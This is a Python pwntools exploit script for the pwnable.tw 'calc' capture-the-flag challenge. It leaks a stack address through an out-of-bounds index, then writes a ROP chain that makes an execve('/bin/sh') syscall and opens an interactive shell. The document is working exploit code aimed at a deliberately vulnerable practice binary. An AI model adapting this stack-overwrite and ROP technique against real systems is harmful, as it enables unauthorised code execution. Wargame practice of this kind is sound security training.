#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
context_log='debug'
#p=remote('chall.pwnable.tw',10100)
p = process('./calc')

keys=[0x0805c34b,0xb,0x080701d1,0,0,0x08049a21,u32('/bin'),u32('/sh\0')]

def leak_binsh_addr():
    p.recv(1024)
    p.sendline('+'+str(360))
    ebp_addr = int(p.recv())
    rsp_addr =((ebp_addr+0x100000000)&0xFFFFFFF0)-16
    binsh_addr = rsp_addr+20-0x100000000
    return binsh_addr

keys[4] = leak_binsh_addr()

def write_stack(addr,content):
    p.sendline('+'+str(addr))
    recv = int(p.recv())
    if content < recv:
        recv = recv - content
        p.sendline('+'+str(addr)+'-'+str(recv))

    else:
        recv = content-recv
        p.sendline('+'+str(addr)+'+'+str(recv))

    p.recv()


for i in range(8):
    write_stack(361+i,keys[i])

p.sendline('bye\n')
p.interactive()
